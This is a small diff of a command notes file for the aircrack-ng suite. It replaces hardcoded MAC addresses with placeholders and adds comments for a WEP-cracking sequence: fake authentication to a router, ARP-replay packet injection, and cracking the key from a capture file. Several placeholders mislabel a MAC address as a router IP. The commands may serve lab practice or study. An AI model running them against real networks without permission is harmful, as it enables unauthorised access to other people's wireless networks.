@@ -1,6 +1,9 @@
-sudo aireplay-ng -1 0 -a 6C:19:8F:BC:CD:9A wlan0mon
+# Sending authentication request to the router 
+sudo aireplay-ng -1 0 -a [Router Ip goes here] wlan0mon
 
-sudo aireplay-ng -3 -b 6C:19:8F:BC:CD:9A -h 66:74:78:e9:76:89 wlan0mon
+# Setting source MAC address
+sudo aireplay-ng -3 -b [Router Ip goes here] -h [Setting source MAC address] wlan0mon
 
-sudo aireplay-ng -b 6C:19:8F:BC:CD:9A networkme.cap
+# Use to crack the keys from the IV collected in the capture file
+sudo aircrack-ng -b [Router Ip goes here] networkme.cap
 
